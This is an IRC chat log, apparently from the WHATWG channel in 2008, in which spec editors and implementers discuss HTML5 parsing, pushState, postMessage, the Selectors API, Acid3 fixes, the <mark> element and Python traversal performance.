[21:19:00.0000] <Hixie>
we need both B1 and B2 to fire, but...

[21:21:00.0000] <Hixie>
hmm, pushState() as defined doesn't work right at all

[21:21:01.0000] <Hixie>
well bummer.

[21:34:00.0000] <Hixie>
hmmmmmmmm

[21:34:01.0000] <Hixie>
so it seems we need an event to fire when you switch to an entry that isn't a state entry

[21:34:02.0000] <Hixie>
then everything is fine

[01:05:00.0000] <annevk>
Hixie, hmm, I wasn't the one who added that test, I'm just fixing SVG to be consistent :p

[01:46:00.0000] <jgraham>
hsivonen: You might be interested in http://blog.mozilla.com/dmandelin/2008/02/14/wtf-16/

[01:48:00.0000] <hsivonen>
jgraham: thanks. Yeah, UTF-16 is overall a mistake. For some environments (like Java) it is a mistake not worth fixing, though.

[01:49:00.0000] <jruderman>
why? because Java is dead?

[01:49:01.0000] <hsivonen>
jruderman: no, because having an undisturbed Java-wide consistent UTF is too useful

[01:52:00.0000] <hsivonen>
I think roc is right about iterators

[01:52:01.0000] <hsivonen>
in general, it is a mistake to let app code index into the string backing buffer

[02:45:00.0000] <Lachy_>
annevk, yt?

[02:46:00.0000] <Lachy_>
annevk, to address Boris' comment about supporting the same set of selectors in both CSS and Selectors API, should I make that a SHOULD or MUST requirement?

[02:54:00.0000] <hsivonen>
hmm. Firefox 2 makes the whole GUI on Mac OS X 10.5.2 unusable

[02:54:01.0000] <hsivonen>
for me at least. repeatedly

[02:54:02.0000] <hsivonen>
no such problem with minefield

[02:54:03.0000] <gsnedders>
working fine here

[02:55:00.0000] <gsnedders>
(but admittedly, I don't use Fx much)

[02:55:01.0000] <hsivonen>
I guess it is time to migrate my main profile to Firefox 3

[02:56:00.0000] <Lachy_>
annevk, I have added this to the spec. "If the user agent also supports some level of CSS, the implementation must support the same set of set of selectors that are supported by the CSS implementation."

[02:56:01.0000] <Lachy_>
I'll check it into cvs later

[04:00:00.0000] <annevk>
Lachy, looks good

[04:15:00.0000] <hsivonen>
annevk: is the xml-dev thread about slimming XML on your XML5 radar?

[04:16:00.0000] <annevk>
no

[04:16:01.0000] <annevk>
sounds good though

[04:20:00.0000] <annevk>
I got the SVG WG to use 16-bit units btw...

[04:20:01.0000] <hsivonen>
nice

[04:21:00.0000] <hsivonen>
http://lists.xml.org/archives/xml-dev/200802/msg00149.html

[05:00:00.0000] <annevk>
have I got it right that postMessage() can be implemented as in the spec and that whatever extension will come will be on top of that?

[05:01:00.0000] <annevk>
or is postMessage() going to be revised soonish, once again?

[05:05:00.0000] <zcorpan>
current spec: void postMessage(in DOMString message, in DOMString origin);

[05:05:01.0000] <zcorpan>
Hixie's proposal: void postMessage(in DOMString message, in EndPoint endPoint, in DOMString origin);

[05:06:00.0000] <annevk>
true, but is that done through overloading or should only the latter be supported?

[05:07:00.0000] <annevk>
i guess my real question is what Firefox 3 will ship so we can align with them

[05:36:00.0000] <annevk>
http://lists.w3.org/Archives/Public/public-xml-core-wg/2008Feb/thread.html#msg26

[05:36:01.0000] <annevk>
public-xml-core-wg realizing how the Web functions

[05:38:00.0000] <Philip`>
Hmm, I get an infinite loop on <table><tr><table> (whereas html5lib and validator.nu don't), and I can't tell that I'm wrong

[05:40:00.0000] <annevk>
that's <table><tr></table>, no?

[05:41:00.0000] <zcorpan>
<table><tr></table><table> i think

[05:41:01.0000] <annevk>
yeah

[05:42:00.0000] <Philip`>
The <table> gets reprocessed in "in table" mode, which creates a </table> that gets processed in that mode, which generates implied end tags, and the current node is a <tr> so it generates a </tr>, which gets ignored because it's "in table"

[05:42:01.0000] <Philip`>
(and then it generates implied end tags for eternity)

[05:42:02.0000] <zcorpan>
Act as if an end tag token with the tag name "table" had been seen, then, if that token wasn't ignored, reprocess the current token.

[05:42:03.0000] <zcorpan>
Note: The fake end tag token here can only be ignored in the fragment case.

[05:43:00.0000] <Philip`>
It never gets as far as that "if"

[05:43:01.0000] <Philip`>
because the act-as-if-</table> never terminates

[05:44:00.0000] <annevk>
Philip`, only <table> should be treated as-if

[05:44:01.0000] <annevk>
not the other new tokens

[05:45:00.0000] <Philip`>
Hmm, that seems quite non-obvious

[05:47:00.0000] <Philip`>
I've interpreted it as being "old = mode; mode = InTable; process(<table>); if (mode wasn't changed while processing) mode = old"

[05:54:00.0000] <annevk>
we do mode = newmode; process(...); mode = currentmode

[05:54:01.0000] <annevk>
iirc

[05:56:00.0000] <Philip`>
Wouldn't that mean the </table> which gets generated and processed inside the process(...) would be done in 'newmode' ("in table") too?

[05:57:00.0000] <Philip`>
Seems to just do self.parser.phases["inTable"].processStartTag(name, attributes)

[05:58:00.0000] <annevk>
yeah, sorry

[06:00:00.0000] <hsivonen>
Philip`: IIRC, at least in v.nu parser old mode is only needed for moving from the endgame back to in body or in frameset

[06:20:00.0000] <gsnedders>
ergh. the spec-gen is so badly documented.

[07:04:00.0000] <annevk>
Lachy, why does the latest CVS version not use the Editor's draft template?

[07:04:01.0000] <annevk>
can I quickly fix that, as well as the date?

[07:04:02.0000] <annevk>
or are you editing?

[07:20:00.0000] <Lachy>
I've made some edits that still need to be checked in

[07:21:00.0000] <annevk>
oh, ok

[07:21:01.0000] <Lachy>
crap, it should be using the editor's draft template.

[07:21:02.0000] <annevk>
can you do that?

[07:22:00.0000] <Lachy>
Yes, it will get fixed with the next check in

[07:23:00.0000] <annevk>
i meant checking in

[07:25:00.0000] <annevk>
Hmm, Android SDK includes Ogg Vorbis

[07:25:01.0000] <annevk>
i did not know

[07:26:00.0000] <Lachy>
all fixed

[07:27:00.0000] <Philip`>
Hmph, html5lib cheats with reprocessing and fostering

[07:27:01.0000] <Philip`>
like if you say <table><a><a> then the implied </a> doesn't go through the "in table" mode

[07:27:02.0000] <Lachy>
/me needs to learn how to use W3C CVS from my Mac, instead of having to do it from my home PC all the time

[07:28:00.0000] <annevk>
you can only say cheats if we fail a test :)

[07:28:01.0000] <hsivonen>
Philip`: surely the top of the stack is no longer IN_TABLE at that point?

[07:28:02.0000] <Philip`>
You fail a test that does <table><a><a> and expects a certain number of parse errors :-)

[07:28:03.0000] <annevk>
Lachy, the date is still broken

[07:28:04.0000] <hsivonen>
or do I misremember stuff?

[07:28:05.0000] <annevk>
Lachy, you should omit the date parameter

[07:29:00.0000] <hsivonen>
it has been a while since I have thought about the tree builder

[07:29:01.0000] <annevk>
Philip`, it's ok to supress parse errors i believe :)

[07:29:02.0000] <Philip`>
hsivonen: Ah, yes, the </a> shouldn't get fostered, but it should still go through "in table" and generate a parse error

[07:30:00.0000] <Philip`>
/me can't find an instance in html5lib where it would cause a different parse tree

[07:31:00.0000] <Lachy>
oops, I still had the date set in my .bat file. Fixed

[07:33:00.0000] <annevk>
Lachy, did you see the e-mail about dumping StaticNodeList?

[07:33:01.0000] <Lachy>
the one from you in response to me?

[07:34:00.0000] <Lachy>
http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0080.html ?

[07:34:01.0000] <annevk>
yeah

[07:34:02.0000] <Lachy>
I will do it

[07:34:03.0000] <hsivonen>
jgraham__: the commonality thread you replied to reminds me of http://www.nytimes.com/2008/01/20/magazine/20wwln-freak-t.html?_r=4&ref=magazine&oref=slogin&oref=slogin&oref=slogin&oref=slogin

[07:35:00.0000] <hsivonen>
though sending that link to the list would probably be seen as a flame

[07:36:00.0000] <Lachy>
it's a rather complicated change, since I need to change/remove all occurrences of StaticNodeList, define the NodeList to be returned as not live and make sure no errors are introduced in the process

[07:37:00.0000] <annevk>
true

[07:37:01.0000] <Lachy>
I'll give it a go

[07:45:00.0000] <Lachy>
annevk, any suggested text for how to define the node list as static?

[07:48:00.0000] <annevk>
return the list of elements as a static object implementing the NodeList interface

[07:48:01.0000] <annevk>
something in that direction

[07:49:00.0000] <annevk>
or maybe "static NodeList object"

[07:54:00.0000] <Philip`>
/me ends up changing his 'fostering' flag to be an integer, so he can handle nested fostering without cheating

[07:55:00.0000] <Philip`>
http://philip.html5.org/tools/parser/?%3Ctable%3E%3Ctr%3E%3Ctable%3E - now with slightly fewer infinite loops, hooray

[07:58:00.0000] <Lachy>
annevk, "The NodeList object returned by the querySelectorAll()  methods must not be live. Subsequent changes to the structure of the underlying document must not be reflected in the NodeList  object. The object must instead contain a list of matching Element nodes that were in the document at the time the list was created."

[08:00:00.0000] <annevk>
s/must not be live/must be static/

[08:01:00.0000] <annevk>
or s/must not be live/must be static (not live)/

[08:01:01.0000] <annevk>
the other statements can be phrased as statements of facts instead of conformance criteria

[08:03:00.0000] <Lachy>
"must be static (not live)" works, where _live_ is a link to the defintion of live lists in DOM3

[08:03:01.0000] <annevk>
i think it's universally understood what it means, but you could do that

[08:04:00.0000] <Lachy>
yeah, I just wanted to make it absolutely clear

[08:06:00.0000] <Philip`>
http://www.w3.org/mid/op.t2kr1qnf64w2qv⊙aooc - internal server error?

[08:06:01.0000] <annevk>
wfm

[08:06:02.0000] <annevk>
http://lists.w3.org/Archives/Public/public-forms-tf/2007Nov/0000.html

[08:07:00.0000] <Philip`>
Oh, it worked on the third attempt

[08:22:00.0000] <annevk>
oops... why did I confuse vorbis with theora...

[08:22:01.0000] <Lachy>
annevk, changes have been committed

[08:22:02.0000] <Lachy>
let me know if I buggered anything up

[08:23:00.0000] <Lachy>
/me goes to friday beer

[10:57:00.0000] <gsnedders>
/me wonders how the spec-gen deals with broken stuff

[10:59:00.0000] <Hixie>
annevk: postMessage() is reasonable stable as currently in the spec

[10:59:01.0000] <Hixie>
the EndPoint extensions are backwards compatible

[11:03:00.0000] <gsnedders>
anyone know how to get all elements directly containing "foo" using XPath, and not any parent of a text node containing the string?

[14:45:00.0000] <jgraham>
/me considers posting hsivonen's NYT link to public-html

[14:46:00.0000] <Hixie>
hahaha

[14:46:01.0000] <Hixie>
/me notices that the 404 page on acid3.acidtests.org is coming out as the favicon in certain browsers

[14:46:02.0000] <Hixie>
unexpected bug!

[14:47:00.0000] <Hixie>
jgraham: what does the article say?

[14:51:00.0000] <hsivonen>
Hixie: the article presents three cases where laws that are supposed to protect those who are worse off make their situation even worse my creating bad incentives for others

[14:51:01.0000] <Hixie>
a'h

[14:51:02.0000] <hsivonen>
Hixie: that Americans with Disabilities Act gives an incentive to doctors not to take deaf patient

[14:52:00.0000] <hsivonen>
Hixie: and that Mosaic law on money lending and agriculture are bad for the poorest in Israel

[14:53:00.0000] <hsivonen>
Hixie: and how protecting habitats of endangered species creates an incentive for landowners to clear their land pre-emptively 

[14:53:01.0000] <Hixie>
and how requiring 'alt' makes people add bogus values to shut up validators? :-)

[14:55:00.0000] <hsivonen>
I guess the economists haven't examined HTML yet

[14:56:00.0000] <Hixie>
i think anyone who would realise the implications of that article are likely already convinced

[15:09:00.0000] <jgraham>
Hixie: I was considering saying that the critical take away message is that we have to operate a feedback loop: a) do things that we think are a good idea b) assess the _actual_ impact of those things c) make changes where it urns out things didn't have the desired impact

[15:09:01.0000] <jgraham>
We are at satge b

[15:09:02.0000] <jgraham>
s/satge/stage/

[15:09:03.0000] <Hixie>
we're at all three stages on different parts of the spec

[15:10:00.0000] <Hixie>
but the above should go without saying for all spec development work

[15:10:01.0000] <Hixie>
and indeed, almost all work of any knid

[15:11:00.0000] <jgraham>
I guess that's not obvious to everyone. I really just want people to understand that stages b) and c) have to happen as  part of HTML5

[15:11:01.0000] <jgraham>
unless we want it to be no better than HTML 4

[15:11:02.0000] <hsivonen>
Hixie: evidence suggests that a lot of stuff that should go without saying given suitable economics or tecnology strategy background doesn't go without saying

[15:12:00.0000] <gsnedders>
anyone any better way to achieve <http://pastebin.ca/905674>?

[15:12:01.0000] <Hixie>
jgraham: i encourage you to advocate this; i'm just skeptical that there are people who are still unconvinced who can be convinced.

[15:13:00.0000] <jgraham>
gsnedders: Define better. You could do it non-recursively which would prevent stack overflow

[15:13:01.0000] <hober>
gsnedders: (sorry to bikeshed, but) wouldn't 'descendents' be a better name than 'children' in this case?

[15:13:02.0000] <Hixie>
i think a lot of people in the w3c think that standards _shouldn't_ have a feedback loop; that standards should be written by experts whose knowledge is by definition perfect and that therefore there cannot be anything to learn.

[15:13:03.0000] <gsnedders>
jgraham: silly Python with it's stack :)

[15:13:04.0000] <jgraham>
Does anyone know if NYT print versions are registration-free?

[15:14:00.0000] <gsnedders>
hober: ironically, I just renamed it from that. I'm still toying between the two.

[15:14:01.0000] <gsnedders>
jgraham: more seriously, it copes with HTML 5 fine

[15:14:02.0000] <jgraham>
gsnedders: In practice you'd get a RecursionError or something

[15:15:00.0000] <jgraham>
(fwiw I'd write the code in the same way but I don't claim to be a particularly good programmer)

[15:15:01.0000] <gsnedders>
/me thought of how to do it non-recursively, then promptly forgot

[15:15:02.0000] <gsnedders>
and now all I think of has major flaws.

[15:15:03.0000] <jgraham>
Can people access http://www.nytimes.com/2008/01/20/magazine/20wwln-freak-t.html?_r=5&oref=login&ref=magazine&pagewanted=print ?

[15:16:00.0000] <hsivonen>
jgraham: that one is behind login too

[15:16:01.0000] <hsivonen>
however, having a referer might work

[15:16:02.0000] <Hixie>
i thought there was some magic "partner" argument one could set

[15:17:00.0000] <hsivonen>
nope, tinyurling doesn't work

[15:17:01.0000] <annevk>
Hixie, Acid3 test 69: "Statement on line 2502: Undefined variable: numberOfChars"

[15:17:02.0000] <hsivonen>
Tantek had a magic tinyurl-like URL for that article that worked magically

[15:18:00.0000] <Dashiva>
/me blinks

[15:18:01.0000] <hsivonen>
/me found the article tantek's tweet

[15:18:02.0000] <Dashiva>
The I18N WG expects every single JS author using selectors API to implement unicode case folding?

[15:18:03.0000] <hsivonen>
Dashiva: or normalization

[15:18:04.0000] <hsivonen>
or did I misread?

[15:18:05.0000] <jwalden>
case-insensitivity was a bad idea

[15:18:06.0000] <billmason>
NYT link w/o login.  http://www.nytimes.com/2008/01/20/magazine/20wwln-freak-t.html?_r=1&ex=1358485200&en=0d05099c03c97375&ei=5090&partner=rssuserland&emc=rss&pagewanted=all&oref=slogin

[15:19:00.0000] <gsnedders>
/me now can't think of to do it non-recursively

[15:19:01.0000] <Philip`>
jgraham: http://www.nytimes.com/2008/01/20/magazine/20wwln-freak-t.html?_r=5&oref=login&ref=magazine&pagewanted=print works for me without login

[15:19:02.0000] <jgraham>
billmason: Thanks :)

[15:20:00.0000] <billmason>
You're welcome.  I use http://nytimes.blogspace.com/genlink to get those links, btw.  Comes in handy.

[15:20:01.0000] <Dashiva>
hsivonen: Yeah, that's the next point, I see

[15:20:02.0000] <Hixie>
anne: line 2502 is a comment

[15:20:03.0000] <Hixie>
annevk: fixed

[15:21:00.0000] <annevk>
hmm

[15:22:00.0000] <annevk>
ah yeah, now I get the error i was expecting

[15:23:00.0000] <annevk>
not sure i'm going to debug it though, SVG is no fun

[15:23:01.0000] <Hixie>
hah

[15:24:00.0000] <annevk>
https://bugzilla.mozilla.org/show_bug.cgi?id=379461 dbaron ftw!

[15:24:01.0000] <annevk>
my memory says we fixed it too, so that makes two out of three browsers

[15:25:00.0000] <Philip`>
gsnedders: r=[]; c=[Node]; while c: c += c[0].childNodes; r.append(c.pop(0)) or something roughly like that, I think

[15:27:00.0000] <Philip`>
(Python isn't entirely good at one-liners, sadly)

[15:28:00.0000] <jgraham>
I think if you want to be really fancy you can do it without an explicit stack; basically for each node you go to the first child, if there is one, otherwise go to the next sibling otherwise go to the parent (but not back to he first child)

[15:30:00.0000] <Philip`>
That doesn't seem entirely necessary unless the current DOM is using more than 50% of your RAM and you can't afford to make another copy of it

[15:30:01.0000] <Philip`>
and then it's probably easier and cheaper just to stick another 2GB of RAM in so you won't have to worry about it

[15:31:00.0000] <jgraham>
:)

[15:31:01.0000] <gsnedders>
Philip`: my recursive version is twice as fast going over HTML 5. peh.

[15:31:02.0000] <gsnedders>
jgraham: yeah, that's what I was thinking of doing

[15:32:00.0000] <Philip`>
Does Python do something silly like not use double-linked lists for 'list'?

[15:32:01.0000] <gsnedders>
double-linked lists?

[15:32:02.0000] <jgraham>
Philip`: list == array

[15:33:00.0000] <Philip`>
Hmm, that'd probably make .pop(0) quite expensive then

[15:33:01.0000] <jgraham>
gsnedders: You could investigate the deque class in the collections module

[15:33:02.0000] <gsnedders>
Philip`: pop seems perfectly cheap

[15:33:03.0000] <jgraham>
Yeah, I guess pop(0) will be O(N) but pop(-1) will be cheap

[15:34:00.0000] <gsnedders>
    97901    0.479    0.000    0.479    0.000 {method 'pop' of 'list' objects}

[15:35:00.0000] <gsnedders>
(i.e., percall is 0.00 sec)

[15:35:01.0000] <jgraham>
gsnedders: Is that pop(0)?

[15:35:02.0000] <gsnedders>
ya

[15:36:00.0000] <jgraham>
/me still suggests looking up deque

[15:36:01.0000] <gsnedders>
http://pastebin.ca/905707 (top is non-recursive)

[15:37:00.0000] <Philip`>
from collections import deque; r=[]; c=deque([node]); while c: t=c.popleft(); c.extend(t.childNodes); r.append(t) maybe

[15:39:00.0000] <jgraham>
gsnedders: It looks like function call overhead is killing you

[15:40:00.0000] <gsnedders>
deque is back up to speed

[15:40:01.0000] <jgraham>
specifically __getattr__

[15:40:02.0000] <gsnedders>
yeah

[15:40:03.0000] <gsnedders>
that's what I thought

[15:42:00.0000] <Philip`>
/me still suggests using Psyco :-)

[15:44:00.0000] <gsnedders>
Philip`: peh. at least I'm not actually parsing about ten/fifteen times like the real spec-gen

[15:45:00.0000] <Philip`>
(I think html5lib goes about twice as fast under Psyco)

[15:45:01.0000] <gsnedders>
.extend() instead of += cuts out a lot of the function calls, so that makes the standard non-recursive one quicker

[15:45:02.0000] <jgraham>
/me still suggests lxml

[15:45:03.0000] <gsnedders>
Philip`: (that would make a difference)

[15:45:04.0000] <gsnedders>
/me tries to remember why he didn't use lxml

[15:46:00.0000] <Philip`>
cssutils does some fun "c = self.text.pop(0)" for every single character while tokenising stylesheets, which completely destroys performance because of the O(n) thing

[15:46:01.0000] <Philip`>
...though it looks like that code is rewritten in the latest version, so maybe they fixed that problem

[15:47:00.0000] <gsnedders>
/me really ought to get his head around big-O notation

[15:51:00.0000] <Philip`>
It's easy - O(1) means you're hiding the expensive operations on your data structure, O(n) means you're using the expensive operations on your data structure, O(n log n) means you're using trees, and O(e^n) means you're working on an interesting problem

[15:51:01.0000] <gsnedders>
/me headdesks

[15:52:00.0000] <jgraham>
O(N^2) means the interviewer wants you to think of a different solution :)

[15:56:00.0000] <gsnedders>
Can I get a serious explanation?

[15:57:00.0000] <takkaria>
http://www.google.co.uk/url?sa=t&ct=res&cd=1&url=http%3A%2F%2Fen.wikipedia.org%2Fwiki%2FBig_O_notation&ei=Qyi2R8u7IaWwwQHGwJDICg&usg=AFQjCNFsPl2CW_acj-E5rq3PZ17cwqaJ2g&sig2=K2R1u4iESPxXmFtCt8TmqQ

[15:57:01.0000] <takkaria>
er

[15:57:02.0000] <takkaria>
I didn't realise google did horrible redirects on its own urls thesedays

[15:57:03.0000] <gsnedders>
takkaria: I've been trying to get my head around that article for a while. I've still failed.

[15:57:04.0000] <Philip`>
It rewrites the href just as you click on the link

[15:58:00.0000] <Philip`>
so it works alright if you right-click-and-copy-link before following the link

[15:58:01.0000] <jgraham>
N is the number of elements you feed in to the algorithm. O(foo(N)) means that as N changes the running time scales like foo(N)

[15:58:02.0000] <Philip`>
Oops, I broke it

[15:58:03.0000] <Philip`>
Oh, wrong window

[15:59:00.0000] <gsnedders>
jgraham: and there's nothing more complex than that?

[15:59:01.0000] <jgraham>
gsnedders: working out what foo is for a given algorithm

[15:59:02.0000] <gsnedders>
jgraham: well, obviously :)

[15:59:03.0000] <jgraham>
/me should probably leave this to someone with a CS background


2008-02-16
[16:00:00.0000] <SadEagle>
gsnedders: that's pretty much it, though there is math involved. Short conceptual summary, though.. Let  n = 10^6.

[16:00:01.0000] <Philip`>
O(foo(N)) means the running time scales like foo(N) in the limit of large N

[16:00:02.0000] <Philip`>
(except it's stupid because for large N you're going to run out of memory)

[16:01:00.0000] <jgraham>
(unless you're Google)

[16:01:01.0000] <gsnedders>
Philip`: how does it deal with memory too?

[16:01:02.0000] <gsnedders>
(or me)

[16:01:03.0000] <gsnedders>
:P

[16:01:04.0000] <gsnedders>
/me needs more memory, badly.

[16:01:05.0000] <SadEagle>
gsnedders: An O(1) algorithm will take some small number of operations... An O(n) will do ~1 million.  O(n^2) one will do ~10^12, a trillion... An O(log n) one will do something to the order of 20, etc.

[16:01:06.0000] <SadEagle>
Philip`: not really. Quadratic complexity shows up easily for very small input sizes.

[16:02:00.0000] <SadEagle>
gsnedders: it can be applied to that, yes, though that's not as common.

[16:02:01.0000] <Philip`>
gsnedders: You can say you're measuring memory rather than processing time, like saying that an array of size n requires O(n) memory

[16:02:02.0000] <gsnedders>
SadEagle: surely the number of ops. depends on the size of n?

[16:02:03.0000] <gsnedders>
/me squints

[16:03:00.0000] <SadEagle>
gsnedders: yes. but if you look at my examples, something that does about n^2 operations does a lot more work then something that does about n operations, when n is large enough.

[16:03:01.0000] <gsnedders>
/me forgot you stated what value n was

[16:04:00.0000] <gsnedders>
/me is too tired

[16:04:01.0000] <SadEagle>
1 million for illustrative purposes..

[16:04:02.0000] <SadEagle>
hmm, surely someone made a nice chart someplace.. Like probably on the WP article takkaria linked to.

[16:04:03.0000] <gsnedders>
/me needs to go sleep

[16:04:04.0000] <gsnedders>
g'nite

[16:05:00.0000] <jgraham>
goodnight

[16:11:00.0000] <annevk>
Hixie, Acid3 loads xhtml.1 three times

[16:11:01.0000] <Hixie>
duh

[16:11:02.0000] <Hixie>
suck, i do

[16:11:03.0000] <Hixie>
fixed, it is

[16:11:04.0000] <Hixie>
thanks

[16:14:00.0000] <annevk>
good, we still pass :)

[16:15:00.0000] <jwalden>
gsnedders: so, for O(f(n)), that implies that, given an input of size n, the algorithm runs in time/uses space in the range [c_1 * f(n), c_2 * f(n)], for all n > some k

[16:15:01.0000] <jwalden>
basically, long-run the runtime/space is proportional to f(n)

[16:16:00.0000] <jwalden>
oh, he left

[16:16:01.0000] <Dashiva>
Strictly speaking that's theta, not O

[16:16:02.0000] <Philip`>
O is only an upper bound

[16:16:03.0000] <SadEagle>
I am pretty sure he went to sleep :-)

[16:16:04.0000] <jwalden>
wrong; I said "in", not bounded by on both sides

[16:17:00.0000] <Philip`>
If it's in a range then that's bounding it on both sides

[16:17:01.0000] <Philip`>
(if it's a finite range, anyway)

[16:17:02.0000] <SadEagle>
well, he did permit c_1 to be 0, but also c_1 wasn't constraint to be positive :-)

[16:17:03.0000] <jwalden>
har har

[16:17:04.0000] <jwalden>
/me pulls out clrs

[16:17:05.0000] <Philip`>
What's wrong with an algorithm that takes negative time?

[16:18:00.0000] <Philip`>
You're dragging down the theory with mere practical concerns

[16:18:01.0000] <Dashiva>
There are algorithms based on answers from the future

[16:18:02.0000] <Dashiva>
Does that count as negative time?

[16:18:03.0000] <SadEagle>
f(n) = O(g(n))  iff \exists c > 0, n_0 >= 0. \forall n >= n_0.  f(n) <= cg(n).

[16:19:00.0000] <Philip`>
What happens if your algorithm involves extreme gravitational forces and causes time itself to change as a function of n?

[16:19:01.0000] <SadEagle>
Philip`: yeah, it's probably extraneous if you actually want O and not theta :-)

[16:19:02.0000] <Hixie>
er guys, i don't want to worry y'all, but it looks like your keyboards have got errors

[16:19:03.0000] <Hixie>
the text you're writing is all coming out with lots of weird punctuation

[16:19:04.0000] <jwalden>
latex ftw

[16:20:00.0000] <jwalden>
yeah, I did mistype the bounds for O

[16:20:01.0000] <jwalden>
I meant the right thing, tho!

[16:20:02.0000] <jgraham>
/me notes there have been far too few \ for latex

[16:21:00.0000] <jwalden>
c_0 is totally latex

[16:21:01.0000] <Dashiva>
Intelligent sort is O(0), I wonder if you could make it negative somehow

[16:21:02.0000] <jgraham>
jwalden: Only in $ or some other math mode :)

[16:21:03.0000] <SadEagle>
Hixie: would you prefer MathML?

[16:22:00.0000] <jwalden>
heh

[16:22:01.0000] <Hixie>
SadEagle: :-P

[16:22:02.0000] <SadEagle>
(I guess that's one way of making me shut up :-) )

[16:23:00.0000] <Hixie>
so, not to drag the topic of conversation back to html5 or anything, but i think i'm gonna have to make it so documents in session history always know what the last state object (from pushState) that was activated on that document is

[16:32:00.0000] <Hixie>
wow, i didn't mean to kill the conversation

[16:42:00.0000] <jgraham>
Hixie: What's the use case?

[16:42:01.0000] <Hixie>
making state objects work at all in the face of session history navigation

[16:42:02.0000] <Hixie>
the current algorithm is complete BS

[16:43:00.0000] <Hixie>
(this doesn't affect the APIs at all)

[16:57:00.0000] <Hixie>
jgraham__: very well expressed

[17:09:00.0000] <Hixie>
i checked in the aforementioned change

[19:24:00.0000] <Hixie>
hmmm

[19:24:01.0000] <Hixie>
/me investigates .query = '' and .hash = ''

[19:34:00.0000] <Hixie>
(s/query/search/. blame netscape people. probably brendan.)

[19:55:00.0000] <Lachy>
I wonder how the i18n WG realistically expects selectors api to require unicode case folding, given that an implementation of that in JavaScript is not trivial and would be ignored by most authros.

[20:08:00.0000] <Hixie>
what would it mean?

[20:08:01.0000] <Hixie>
case folding for what?

[20:08:02.0000] <Hixie>
prefixes?

[20:08:03.0000] <Lachy>
yes

[20:08:04.0000] <Hixie>
i thought the csswg had agreed to making that case-sensitive or something

[20:08:05.0000] <Hixie>
or ascii-only

[20:08:06.0000] <Lachy>
they somehow expect authors to implement that in their NSResolver

[20:09:00.0000] <Lachy>
the CSSWG agreed to make case sensitivity dependent upon the mechanism used to declare it

[20:09:01.0000] <Hixie>
oh

[20:09:02.0000] <Hixie>
so just make it sensitive

[20:09:03.0000] <Hixie>
and be done

[20:09:04.0000] <Lachy>
it basically is

[20:09:05.0000] <Hixie>
so what's the problem?

[20:10:00.0000] <Lachy>
did you read the mail from i18n WG on public-webapi?

[20:10:01.0000] <Hixie>
i read enough of it to know it wasn't my problem :-)

[20:10:02.0000] <Hixie>
/me looks again

[20:11:00.0000] <Hixie>
oh i see

[20:11:01.0000] <Lachy>
from the point of view of the UA, prefixes need to be treated case sensitively, so "foo" and "FOO" prefixes would need to be resolved separately.

[20:11:02.0000] <Hixie>
right

[20:11:03.0000] <Hixie>
but NSResolver can do whatever

[20:12:00.0000] <Hixie>
I would just remove all mention of the fact that the resolver can fold case

[20:12:01.0000] <Hixie>
since effectively that just means it's defining a set of prefixes

[20:12:02.0000] <Lachy>
yeah, so if the author implements a case insensitive NSResolver, they're effectively just declaring all variants of "foo", "Foo", "FOO", etc.

[20:12:03.0000] <Hixie>
right

[20:13:00.0000] <Hixie>
that removes your issue with the i18nguys

[20:13:01.0000] <Lachy>
I just need to figure out how to adjust the spec, without actually changing any requirements to keep them happy, and to respond to their mail

[20:15:00.0000] <Hixie>
hehe

[20:20:00.0000] <Hixie>
/me checks in his weird .search = '' issue

[20:21:00.0000] <Lachy>
I changed the first note to read: "Although prefixes are case sensitive, the implementation of the NSResolver object may internally handle them case insensitively. However, such an approach is effectively the same as declaring all case variants of the prefix with the same namespace URI."

[20:22:00.0000] <Hixie>
i think they'll still complain

[20:22:01.0000] <Hixie>
if they do, i'd just remove the note altogether :-)

[20:22:02.0000] <Hixie>
(after all, does it really help with anything?)

[20:22:03.0000] <Hixie>
brb

[20:26:00.0000] <Lachy>
I think I can resolve it in a way that they won't complain

[20:27:00.0000] <Lachy>
I think the original reason for the note was because Selectors required case insensitive prefixes

[20:27:01.0000] <Lachy>
but that's no longer the case

[20:30:00.0000] <Hixie>
right

[20:40:00.0000] <Hixie>
ok let

[20:40:01.0000] <Hixie>
us

[20:40:02.0000] <Hixie>
look

[20:40:03.0000] <Hixie>
at...

[20:40:04.0000] <Hixie>
the <m> element

[20:41:00.0000] <Hixie>
anyone have any opinions i should consider in addition to the tons of feedback?

[20:48:00.0000] <Lachy>
keep it!

[20:49:00.0000] <Lachy>
ignore everyone's feedback that disagrees with my opinion

[20:49:01.0000] <Hixie>
yeah, reading this i'm convinced there are good use cases for it

[20:49:02.0000] <Hixie>
i think we should change the name though

[20:49:03.0000] <Lachy>
to what?

[20:49:04.0000] <Hixie>
<m> is too short given that this won't be used that much

[20:49:05.0000] <Hixie>
i dunno

[20:50:00.0000] <Hixie>
<mark> maybe. <highlight> would be way too misspelt...

[20:51:00.0000] <Lachy>
<mark> is ok

[20:51:01.0000] <Lachy>
highlight also suffers from the perception of being presentational, which tends to receive a lot of complaints

[20:53:00.0000] <Hixie>
yes

[20:59:00.0000] <Hixie>
http://lists.whatwg.org/pipermail/whatwg-whatwg.org/2007-February/009286.html is a great UI idea

[21:05:00.0000] <Hixie>
jesus, a lot of people mailed about <m>

[21:16:00.0000] <Lachy>
do you mean the aural example of the UA saying "begin mark. (content) end mark.", or the UI of skipping between marked text?

[21:16:01.0000] <Hixie>
ui

[21:18:00.0000] <Lachy>
how do I deal with the unicode normalisation issue?

[21:19:00.0000] <Lachy>
I obviously can't require the NSResolver to normalise the prefix. Could I require the UA to normalise the prefix before passing it to the resolver?

[21:21:00.0000] <Lachy>
I would rather not, since that would create more surface area for bugs, and be really annoying for authors if one UA had a bug in its normalisation algorithm, resulting in a different string being passed from other UAs

[21:35:00.0000] <Hixie>
well

[21:36:00.0000] <Hixie>
it depends on whether you want to require that UAs normalise before parsing the selectors, or whether you want to require that they not normalise

[21:36:01.0000] <Hixie>
might be easiest to jus check what implemenations are doing

[21:37:00.0000] <Lachy>
yeah.

[21:37:01.0000] <Lachy>
weinig, what does webkit do?

[21:38:00.0000] <weinig>
Lachy: sorry, i missed the beginning of the conversation.  What is the question?

[21:39:00.0000] <Hixie>
Lachy: i wouldn't rely on implementors knowing what they do :-P

[21:39:01.0000] <weinig>
Hixie: :(

[21:39:02.0000] <Lachy>
[06:25]  <Lachy> I obviously can't require the NSResolver to normalise the prefix. Could I require the UA to normalise the prefix before passing it to the resolver?

[21:39:03.0000] <Lachy>
[06:27]  <Lachy> I would rather not, since that would create more surface area for bugs, and be really annoying for authors if one UA had a bug in its normalisation algorithm, resulting in a different string being passed from other UAs

